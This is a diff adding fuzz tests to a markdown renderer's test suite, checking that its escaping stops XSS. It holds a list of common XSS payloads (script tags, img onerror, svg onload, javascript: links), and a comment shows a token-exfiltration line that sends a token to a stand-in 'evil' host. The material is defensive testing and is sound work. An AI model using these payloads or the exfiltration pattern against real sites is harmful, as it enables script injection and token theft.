@@ -199,6 +199,108 @@ test("plain collapses whitespace and drops heading markers", () => {
 });
 
 // ---------------------------------------------------------------------------
+// Escaping invariant, fuzzed.
+//
+// CSP here uses script-src 'unsafe-inline' (the page's own scripts are inline),
+// so CSP does NOT block script execution -- it only blocks loading external
+// resources. That makes this escaping the entire XSS defense, with nothing
+// behind it. Note also that exfiltration would not even need connect-src:
+// location.href = "http://evil/?t=" + TOKEN is a navigation, which CSP does not
+// govern. Hence: no plan text may ever reach innerHTML unescaped, fuzzed here
+// so a future edit cannot quietly reintroduce a sink.
+// ---------------------------------------------------------------------------
+
+const HOSTILE = [
+  '<script>alert(1)</script>',
+  '</script><script>alert(1)</script>',
+  '<img src=x onerror=alert(1)>',
+  '<svg/onload=alert(1)>',
+  '"><img src=x onerror=alert(1)>',
+  "'><img src=x onerror=alert(1)>",
+  '<iframe src="javascript:alert(1)">',
+  '[click](javascript:alert(1))',
+  '`<img src=x onerror=alert(1)>`',
+  '**<img src=x onerror=alert(1)>**',
+  '<a href="#" onmouseover="alert(1)">x</a>',
+  '<body onload=alert(1)>',
+  '\u0001 0 \u0001',
+];
+
+// Every structural position a hostile string can occupy.
+const TEMPLATES = [
+  s => s,
+  s => "# " + s,
+  s => "- " + s,
+  s => "- a\n  - " + s,
+  s => "1. " + s,
+  s => "> " + s,
+  s => "| A | B |\n|---|---|\n| " + s + " | b |",
+  s => "| " + s + " |\n|---|\n| b |",
+  s => "```\n" + s + "\n```",
+  s => "para with " + s + " inline",
+  s => "**bold " + s + "**",
+];
+
+// Only these tags may ever appear in generated html. Asserting on the tag
+// whitelist rather than on substrings is the point: "&lt;img ... onerror=..." is
+// escaped, inert text and must NOT fail, while a real <img> must.
+const ALLOWED = "p|h1|h2|h3|ul|ol|li|code|pre|strong|em|blockquote|" +
+                "table|thead|tbody|tr|th|td|hr";
+const ALLOWED_TAG = new RegExp("</?(" + ALLOWED + ")>", "gi");
+
+test("only whitelisted tags survive, for every hostile input and position", () => {
+  HOSTILE.forEach(hostile => {
+    TEMPLATES.forEach((tpl, ti) => {
+      const md = tpl(hostile);
+      const html = MD.parse(md).map(b => b.html).join("\n");
+      const where = "\n  template " + ti + " with " + JSON.stringify(hostile) +
+        "\n  -> " + html;
+
+      // Strip every tag we legitimately generate. Anything angle-bracketed
+      // left over is either an injected tag or an attribute-bearing tag --
+      // both mean plan text reached the DOM as markup.
+      const residue = html.replace(ALLOWED_TAG, "");
+      assert.ok(!/[<>]/.test(residue.replace(/&lt;|&gt;|&amp;|&quot;|&#39;/g, "")),
+        "unescaped markup survived:" + where + "\n  residue: " + residue);
+
+      // No tag may carry attributes: our generated tags never have any, so an
+      // attribute means injection.
+      assert.ok(!/<[a-z][a-z0-9]*\s[^>]*>/i.test(html),
+        "tag with attributes survived:" + where);
+
+      assert.ok(!/javascript:/i.test(html.replace(/&[a-z]+;/g, "")) ||
+                !/<a\s/i.test(html),
+        "javascript: url in a live anchor:" + where);
+      assert.ok(!/undefined/.test(html), "sentinel corruption:" + where);
+    });
+  });
+});
+
+test("a real tag in plan text is escaped, and escaped text is left as text", () => {
+  const html = MD.parse("<img src=x onerror=alert(1)>").map(b => b.html).join("");
+  assert.strictEqual(html, "<p>&lt;img src=x onerror=alert(1)&gt;</p>");
+});
+
+test("plain() output is always safe once esc()'d, which is how it is used", () => {
+  // plain() is not itself an escaper -- it strips markdown for display. It only
+  // ever reaches the DOM via MD.esc() or textContent, so the invariant is that
+  // esc(plain(x)) is inert.
+  HOSTILE.forEach(hostile => {
+    const out = MD.esc(MD.plain(hostile));
+    assert.ok(!/[<>]/.test(out.replace(/&lt;|&gt;|&amp;|&quot;|&#39;/g, "")),
+      "esc(plain(x)) left raw markup: " + out);
+  });
+});
+
+test("esc neutralises every hostile string", () => {
+  HOSTILE.forEach(hostile => {
+    const out = MD.esc(hostile);
+    assert.ok(!/</.test(out), "raw < survived esc: " + out);
+    assert.ok(!/>/.test(out), "raw > survived esc: " + out);
+  });
+});
+
+// ---------------------------------------------------------------------------
 
 if (failures.length) {
   failures.forEach(f => {
